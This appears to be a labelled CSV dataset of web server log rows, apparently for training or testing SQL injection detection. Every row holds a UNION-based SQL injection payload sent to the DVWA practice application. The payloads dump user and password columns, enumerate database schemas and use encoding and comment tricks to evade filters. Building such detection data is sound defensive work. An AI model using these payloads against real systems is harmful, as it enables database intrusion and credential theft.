ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label,label,label_source,request_hash
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D-1%27+UNION+ALL+SELECT+1,2+--",/vulnerabilities/sqli/,"id%3D-1%27+UNION+ALL+SELECT+1,2+--",HTTP/1.1,200,4246,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,2 --","id=-1' UNION ALL SELECT 1,2 --",,,,0,0,0,sqli_union,1,1,existing_log_label,7d77d46abcaa764ef2d000ff9f52ecc0
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2BUNION%2Bselect%2Bcolumn_name%252Cnull%252C%2Btable_name%2BFrOM%2Binformation_schema.tables%2B%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2BUNION%2Bselect%2Bcolumn_name%252Cnull%252C%2Btable_name%2BFrOM%2Binformation_schema.tables%2B%252523&Submit=Submit,HTTP/1.1,200,1065,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27+UNION+select+column_name%2Cnull%2C+table_name+FrOM+information_schema.tables+%2523&Submit=Submit,id=id%3D%27+UNION+select+column_name%2Cnull%2C+table_name+FrOM+information_schema.tables+%2523&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,c578ce6f987d4222bff73f9ffba87997
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+++union+++ALL+++SelecT+++null%2C+++table_name%2Ctable_schema+++FRoM+++information_schema.tables+++%2523,/vulnerabilities/sqli/,id%3D1%27+++union+++ALL+++SelecT+++null%2C+++table_name%2Ctable_schema+++FRoM+++information_schema.tables+++%2523,HTTP/1.1,200,1365,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'   union   ALL   SelecT   null,   table_name,table_schema   FRoM   information_schema.tables   %23","id=1'   union   ALL   SelecT   null,   table_name,table_schema   FRoM   information_schema.tables   %23",,,,0,0,0,sqli_union,1,1,existing_log_label,c209a8c78567d6368c6703250a052730
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2B%2BUNION%2B%2Bselect%2B%2Btable_name%252Ctable_schema%2B%2B--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2B%2BUNION%2B%2Bselect%2B%2Btable_name%252Ctable_schema%2B%2B--&Submit=Submit,HTTP/1.1,200,1890,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D%27++UNION++select++table_name%2Ctable_schema++--&Submit=Submit,id=id%3D%27++UNION++select++table_name%2Ctable_schema++--&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,48e50c8dc27b3ee7f294a515645afb4f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27+UNION+ALL+Select null, 1,2+From information_schema.tables --",/vulnerabilities/sqli/,"id=1%27+UNION+ALL+Select null, 1,2+From information_schema.tables --",HTTP/1.1,200,2243,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' UNION ALL Select null, 1,2 From information_schema.tables --","id=1' UNION ALL Select null, 1,2 From information_schema.tables --",,,,0,0,0,sqli_union,1,1,existing_log_label,0498b7e4017cf080b7569bec1687f6a5
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+ Union +select +user(), +database(),+ version() %3B-- +-",/vulnerabilities/sqli/,"id=1'+ Union +select +user(), +database(),+ version() %3B-- +-",HTTP/1.1,200,2084,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'  Union  select  user(),  database(),  version() ;--  -","id=1'  Union  select  user(),  database(),  version() ;--  -",,,,0,0,0,sqli_union,1,1,existing_log_label,f452c46f9b93f834f971de7e0609ebfa
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' UNION SELECT 1,version() FROM information_schema.tables /*",/vulnerabilities/sqli/,"id=1' UNION SELECT 1,version() FROM information_schema.tables /*",HTTP/1.1,200,642,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION SELECT 1,version() FROM information_schema.tables /*","id=1' UNION SELECT 1,version() FROM information_schema.tables /*",,,,0,0,0,sqli_union,1,1,existing_log_label,559e438caa1ecf1e070061e5eab09009
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2Bunion%2BSELECT%2Buser%252Cpassword%2B%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2Bunion%2BSELECT%2Buser%252Cpassword%2B%252523&Submit=Submit,HTTP/1.1,200,2227,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D%27+union+SELECT+user%2Cpassword+%2523&Submit=Submit,id=id%3D%27+union+SELECT+user%2Cpassword+%2523&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,719fccdcd752303ee8523377062442c0
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+union+Select+user,password from+dvwa.users+%3B--+-",/vulnerabilities/sqli/,"id%3D1%27+union+Select+user,password from+dvwa.users+%3B--+-",HTTP/1.1,200,3294,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' union Select user,password from dvwa.users ;-- -","id=1' union Select user,password from dvwa.users ;-- -",,,,0,0,0,sqli_union,1,1,existing_log_label,acb2e101499511d6fc76c0db7179f016
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1'%20UNION%20ALL%20SELECT%201,version()%20#",/vulnerabilities/sqli/,"id=-1'%20UNION%20ALL%20SELECT%201,version()%20",HTTP/1.1,200,2404,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,version() #","id=-1' UNION ALL SELECT 1,version() ",,,,0,0,0,sqli_union,1,1,existing_log_label,325af2d5dc56bf42e9a7c72b2a4f84b8
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' UNION SELECT column_name,null, table_name FROM information_schema.tables -- -",/vulnerabilities/sqli/,"id=' UNION SELECT column_name,null, table_name FROM information_schema.tables -- -",HTTP/1.1,200,3501,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=' UNION SELECT column_name,null, table_name FROM information_schema.tables -- -","id=' UNION SELECT column_name,null, table_name FROM information_schema.tables -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,8cab28e452ffeb97340c988088e64b2c
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+UnION+SELECT+1%2C2%2C+table_name+fROM+information_schema.tables+--,/vulnerabilities/sqli/,id%3D%27+UnION+SELECT+1%2C2%2C+table_name+fROM+information_schema.tables+--,HTTP/1.1,200,2156,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=' UnION SELECT 1,2, table_name fROM information_schema.tables --","id=' UnION SELECT 1,2, table_name fROM information_schema.tables --",,,,0,0,0,sqli_union,1,1,existing_log_label,d424ad281cd9468c68671b8042f33196
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,2853,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/,,"id='	UNION	SELECT	1,2	;--	-","id='	UNION	SELECT	1,2	;--	-",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,8e493df0e05052bed12cd361b0c417ab
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27%2BUnion%2BALL%2BSELECT%2Buser%2Cpassword%2B--,/vulnerabilities/sqli/,id%3D-1%27%2BUnion%2BALL%2BSELECT%2Buser%2Cpassword%2B--,HTTP/1.1,200,2362,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=-1'+Union+ALL+SELECT+user,password+--","id=-1'+Union+ALL+SELECT+user,password+--",,,,0,0,0,sqli_union,1,1,existing_log_label,2a907e734055939cd3f350a897602153
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+union+SELECT+user%2Cpassword+%23,/vulnerabilities/sqli/,id%3D%27+union+SELECT+user%2Cpassword+%23,HTTP/1.1,200,4431,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=' union SELECT user,password #","id=' union SELECT user,password #",,,,0,0,0,sqli_union,1,1,existing_log_label,43bd286234f566384ad87ba82986f330
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27%2F%2A%2A%2Funion%2F%2A%2A%2FSElECt%2F%2A%2A%2Fcolumn_name%2Cnull%2F%2A%2A%2F%2F%2A,/vulnerabilities/sqli/,id%3D%27%2F%2A%2A%2Funion%2F%2A%2A%2FSElECt%2F%2A%2A%2Fcolumn_name%2Cnull%2F%2A%2A%2F%2F%2A,HTTP/1.1,200,3659,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id='/**/union/**/SElECt/**/column_name,null/**//*","id='/**/union/**/SElECt/**/column_name,null/**//*",,,,0,0,0,sqli_union,1,1,existing_log_label,8a05eee35561de186abf9fc076215f67
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' UNION ALL SELECT null, user,password FROM information_schema.tables --",/vulnerabilities/sqli/,"id=1' UNION ALL SELECT null, user,password FROM information_schema.tables --",HTTP/1.1,200,1559,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION ALL SELECT null, user,password FROM information_schema.tables --","id=1' UNION ALL SELECT null, user,password FROM information_schema.tables --",,,,0,0,0,sqli_union,1,1,existing_log_label,54aca6384b00639c69a651d5dfe4a94b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+union+ALL+Select+null%2C+user%2Cpassword+FROM+users+--,/vulnerabilities/sqli/,id%3D1%27+union+ALL+Select+null%2C+user%2Cpassword+FROM+users+--,HTTP/1.1,200,2972,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' union ALL Select null, user,password FROM users --","id=1' union ALL Select null, user,password FROM users --",,,,0,0,0,sqli_union,1,1,existing_log_label,83726a478ded6bd0866e1d733c76d487
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' union ALL Select null, table_name,table_schema from information_schema.tables -- -",/vulnerabilities/sqli/,"id=1' union ALL Select null, table_name,table_schema from information_schema.tables -- -",HTTP/1.1,200,3698,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' union ALL Select null, table_name,table_schema from information_schema.tables -- -","id=1' union ALL Select null, table_name,table_schema from information_schema.tables -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,2d64011c0a3f62641f9ba0dd0d1990c6
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+UNION+SELECT+table_name%2Ctable_schema%2C+table_name+FROM+information_schema.tables+--,/vulnerabilities/sqli/,id%3D%27+UNION+SELECT+table_name%2Ctable_schema%2C+table_name+FROM+information_schema.tables+--,HTTP/1.1,200,3957,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=' UNION SELECT table_name,table_schema, table_name FROM information_schema.tables --","id=' UNION SELECT table_name,table_schema, table_name FROM information_schema.tables --",,,,0,0,0,sqli_union,1,1,existing_log_label,eb64f53bbd400a30e5121ddcf30fe7b0
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2Bunion%2Bselect%2B1%252Cversion%2528%2529%2Bfrom%2Binformation_schema.columns%2B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2Bunion%2Bselect%2B1%252Cversion%2528%2529%2Bfrom%2Binformation_schema.columns%2B%2523&Submit=Submit,HTTP/1.1,200,957,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27+union+select+1%2Cversion%28%29+from+information_schema.columns+%23&Submit=Submit,id=id%3D1%27+union+select+1%2Cversion%28%29+from+information_schema.columns+%23&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,84a508df11bc0f3062167f557e4f01ff
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27%2Bunion%2Bselect%2Btable_name%2Ctable_schema%2C%2Btable_name%2BFrom%2Binformation_schema.tables%2B%23,/vulnerabilities/sqli/,id%3D%27%2Bunion%2Bselect%2Btable_name%2Ctable_schema%2C%2Btable_name%2BFrom%2Binformation_schema.tables%2B%23,HTTP/1.1,200,2677,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id='+union+select+table_name,table_schema,+table_name+From+information_schema.tables+#","id='+union+select+table_name,table_schema,+table_name+From+information_schema.tables+#",,,,0,0,0,sqli_union,1,1,existing_log_label,a7fa661ac353f6f650ff44c5782cbb52
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=%27+UNION+SELECT+1,version()+--",/vulnerabilities/sqli/,"id=%27+UNION+SELECT+1,version()+--",HTTP/1.1,200,827,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=' UNION SELECT 1,version() --","id=' UNION SELECT 1,version() --",,,,0,0,0,sqli_union,1,1,existing_log_label,38c4fbcf187aea91b6a38fd75c1d5447
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,HTTP/1.1,200,1309,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/search.php,,"id='%20Union%20Select%201,version()%20%23","id=' Union Select 1,version() #",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,59a29be19b9590f165e03e7496f77b06
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+UNION+SELECT+1%2C2+%23,/vulnerabilities/sqli/,id%3D%27+UNION+SELECT+1%2C2+%23,HTTP/1.1,200,3480,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=' UNION SELECT 1,2 #","id=' UNION SELECT 1,2 #",,,,0,0,0,sqli_union,1,1,existing_log_label,9706c2a4b72a29481610a4689b9725cb
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' +UNION +SELECT++user(), +database(),++version() -- -",/vulnerabilities/sqli/,"id%3D1' +UNION +SELECT++user(), +database(),++version() -- -",HTTP/1.1,200,2403,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'  UNION  SELECT  user(),  database(),  version() -- -","id=1'  UNION  SELECT  user(),  database(),  version() -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,aa605ad97b68281e01bd74b3e10b96ff
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' UNION+Select+user(),+database(), version()+--",/vulnerabilities/sqli/,"id%3D1' UNION+Select+user(),+database(), version()+--",HTTP/1.1,200,4054,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION Select user(), database(), version() --","id=1' UNION Select user(), database(), version() --",,,,0,0,0,sqli_union,1,1,existing_log_label,28dd4c397efd4c1911540f8071aa7f7d
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+UNION+ALL+SELECT+null%2C+column_name%2Cnull+FROM+users+%23,/vulnerabilities/sqli/,id%3D1%27+UNION+ALL+SELECT+null%2C+column_name%2Cnull+FROM+users+%23,HTTP/1.1,200,705,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION ALL SELECT null, column_name,null FROM users #","id=1' UNION ALL SELECT null, column_name,null FROM users #",,,,0,0,0,sqli_union,1,1,existing_log_label,62eb8d10228da73d301a1f756e61ae9b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1' union ALL Select user,password ;-- -",/vulnerabilities/sqli/,"id=-1' union ALL Select user,password ;-- -",HTTP/1.1,200,1533,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=-1' union ALL Select user,password ;-- -","id=-1' union ALL Select user,password ;-- -",,,,0,0,0,sqli_union,1,1,existing_log_label,bd12b80753c7dd50e1b7d1a553815b96
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2BUNION%2BselEct%2Buser%252Cpassword%252C%2Btable_name%2Bfrom%2Binformation_schema.tables%2B%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2BUNION%2BselEct%2Buser%252Cpassword%252C%2Btable_name%2Bfrom%2Binformation_schema.tables%2B%252F%252A&Submit=Submit,HTTP/1.1,200,1713,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D%27+UNION+selEct+user%2Cpassword%2C+table_name+from+information_schema.tables+%2F%2A&Submit=Submit,id=id%3D%27+UNION+selEct+user%2Cpassword%2C+table_name+from+information_schema.tables+%2F%2A&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,022ef6194b4c627f3ea83e94202fc399
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1'/**/UNION/**/ALL/**/Select/**/user,password/**/;--/**/-",/vulnerabilities/sqli/,"id=-1'/**/UNION/**/ALL/**/Select/**/user,password/**/;--/**/-",HTTP/1.1,200,1232,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=-1'/**/UNION/**/ALL/**/Select/**/user,password/**/;--/**/-","id=-1'/**/UNION/**/ALL/**/Select/**/user,password/**/;--/**/-",,,,0,0,0,sqli_union,1,1,existing_log_label,e6cf7a161b533c524523dee7865ed4d2
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' UNION Select user,password -- -",/vulnerabilities/sqli/,"id=' UNION Select user,password -- -",HTTP/1.1,200,571,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=' UNION Select user,password -- -","id=' UNION Select user,password -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,76b007d4ad7075b187e3742775751c1c
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BUnion%2BALL%2BSelect%2Bnull%252C%2B1%252C2%2BFrom%2Bdvwa.users%2B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BUnion%2BALL%2BSelect%2Bnull%252C%2B1%252C2%2BFrom%2Bdvwa.users%2B--%2B-&Submit=Submit,HTTP/1.1,200,3104,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27+Union+ALL+Select+null%2C+1%2C2+From+dvwa.users+--+-&Submit=Submit,id=id%3D1%27+Union+ALL+Select+null%2C+1%2C2+From+dvwa.users+--+-&Submit=Submit,,,,0,0,0,sqli_union,1,1,existing_log_label,1d88e169d6b10ab50b91ae59568f299f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' union sELeCT user,password From information_schema.tables -- -",/vulnerabilities/sqli/,"id=1' union sELeCT user,password From information_schema.tables -- -",HTTP/1.1,200,1963,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' union sELeCT user,password From information_schema.tables -- -","id=1' union sELeCT user,password From information_schema.tables -- -",,,,0,0,0,sqli_union,1,1,existing_log_label,a1d55fb080ecbfc105af7d97b2b28073
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27+Union+ALL+SELECT+1%2C2+%2F%2A,/vulnerabilities/sqli/,id%3D-1%27+Union+ALL+SELECT+1%2C2+%2F%2A,HTTP/1.1,200,3525,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=-1' Union ALL SELECT 1,2 /*","id=-1' Union ALL SELECT 1,2 /*",,,,0,0,0,sqli_union,1,1,existing_log_label,58a59eeb2d3775af963294f285b4402d
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27++union++Select++1%2Cversion%28%29++FROM++dvwa.users++%23,/vulnerabilities/sqli/,id%3D1%27++union++Select++1%2Cversion%28%29++FROM++dvwa.users++%23,HTTP/1.1,200,844,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'  union  Select  1,version()  FROM  dvwa.users  #","id=1'  union  Select  1,version()  FROM  dvwa.users  #",,,,0,0,0,sqli_union,1,1,existing_log_label,9804933a7a0c3dd8fa0af73ad3cab8c2
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,3092,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/,,"id=1' UNION ALL SELECT null, 1,2 FROM users %23","id=1' UNION ALL SELECT null, 1,2 FROM users #",application/x-www-form-urlencoded,0,0,1,sqli_union,1,1,existing_log_label,c1279a457ae87f63565636bc7a866e3d
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FALL%2F%2A%2A%2FSelect%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Ftable_name%2Ctable_schema%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FALL%2F%2A%2A%2FSelect%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Ftable_name%2Ctable_schema%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,HTTP/1.1,200,1625,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'/**/union/**/ALL/**/Select/**/null,/**/table_name,table_schema/**/FROM/**/information_schema.tables/**/;--/**/-","id=1'/**/union/**/ALL/**/Select/**/null,/**/table_name,table_schema/**/FROM/**/information_schema.tables/**/;--/**/-",,,,0,0,0,sqli_union,1,1,existing_log_label,ac2e76cc608f8407ceb462123e66c9aa
